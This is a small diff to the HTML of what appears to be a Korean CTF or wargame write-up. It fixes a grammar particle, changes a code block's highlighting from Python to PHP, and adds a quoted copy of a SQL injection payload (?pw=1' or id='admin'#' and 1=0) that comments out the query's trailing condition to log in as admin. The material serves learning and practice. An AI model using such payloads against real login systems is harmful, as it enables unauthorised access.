@@ -2062,9 +2062,12 @@ section 진행 기간
 
 <br>
 
-<p>쿼리문 맨 뒤 <code>and 1=0</code>을 무력화 시키기 위해 주석을 사용하였습니다.</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?pw=<span class="number">1</span><span class="string">&#x27; or id=&#x27;</span>admin<span class="string">&#x27;#&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>쿼리문 맨 뒤 <code>and 1=0</code>를 무력화 시키기 위해 주석을 사용하였습니다.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?pw=<span class="number">1</span><span class="string">&#x27; or id=&#x27;</span>admin<span class="string">&#x27;#&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>?pw=1&#x27; or id= &#x27;admin&#x27;#&#x27; and 1=0</p>
+</blockquote>
 <br>
 
 <blockquote>
